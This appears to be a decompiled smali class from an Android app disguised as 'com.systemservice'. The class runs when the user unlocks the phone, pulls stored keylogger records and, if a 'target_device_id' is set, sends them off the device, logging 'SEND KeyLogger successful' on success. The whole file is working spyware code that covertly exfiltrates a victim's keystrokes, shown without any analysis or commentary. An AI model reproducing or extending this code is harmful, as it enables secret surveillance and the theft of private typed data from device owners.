.class Lcom/systemservice/common/boostReceiver/k;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->onReceive(Landroid/content/Context;Landroid/content/Intent;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Landroid/content/SharedPreferences;

.field final synthetic c:Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;


# direct methods
.method constructor <init>(Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;Landroid/content/Context;Landroid/content/SharedPreferences;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/common/boostReceiver/k;->c:Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;

    iput-object p2, p0, Lcom/systemservice/common/boostReceiver/k;->a:Landroid/content/Context;

    iput-object p3, p0, Lcom/systemservice/common/boostReceiver/k;->b:Landroid/content/SharedPreferences;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    const-string v0, ""

    :try_start_0
    iget-object v1, p0, Lcom/systemservice/common/boostReceiver/k;->a:Landroid/content/Context;

    invoke-static {v1}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/systemservice/common/boostReceiver/k;->c:Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;

    iget-object v1, v1, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->g:Lcom/systemservice/a/h/k;

    const/4 v2, 0x5

    const/4 v3, 0x0

    const/4 v4, 0x0

    invoke-virtual {v1, v4, v3, v3, v2}, Lcom/systemservice/a/h/k;->a(ZLjava/util/Date;Ljava/util/Date;I)Ljava/util/List;

    move-result-object v1

    if-eqz v1, :cond_1

    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v2

    if-lez v2, :cond_1

    iget-object v2, p0, Lcom/systemservice/common/boostReceiver/k;->b:Landroid/content/SharedPreferences;

    const-string v3, "target_device_id"

    invoke-interface {v2, v3, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    new-instance v0, Lcom/systemservice/a/c/h/j;

    iget-object v2, p0, Lcom/systemservice/common/boostReceiver/k;->a:Landroid/content/Context;

    invoke-direct {v0, v2, v4}, Lcom/systemservice/a/c/h/j;-><init>(Landroid/content/Context;Z)V

    iget-object v2, p0, Lcom/systemservice/common/boostReceiver/k;->a:Landroid/content/Context;

    invoke-virtual {v0, v2, v1}, Lcom/systemservice/a/c/h/j;->b(Landroid/content/Context;Ljava/util/List;)I

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v2, 0x1

    const-string v3, "EDIX"

    if-ne v0, v2, :cond_0

    :try_start_1
    sget-object v2, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    const-string v4, "KeyLogger: SEND KeyLogger successful"

    invoke-virtual {v2, v4}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    const-string v2, "SEND KeyLogger successful"

    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/common/boostReceiver/k;->c:Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;

    iget-object v2, v2, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->g:Lcom/systemservice/a/h/k;

    invoke-virtual {v2, v1}, Lcom/systemservice/a/h/k;->a(Ljava/util/List;)V

    goto :goto_0

    :cond_0
    iget-object v2, p0, Lcom/systemservice/common/boostReceiver/k;->c:Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;

    iget-object v2, v2, Lcom/systemservice/common/boostReceiver/UIUserPresentReceiver;->g:Lcom/systemservice/a/h/k;

    invoke-virtual {v2, v1}, Lcom/systemservice/a/h/k;->a(Ljava/util/List;)V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, "SEND KeyLogger PACKAGE ERROR"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "ret_code = "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    const-string v1, "TAG"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    :goto_1
    return-void
.end method
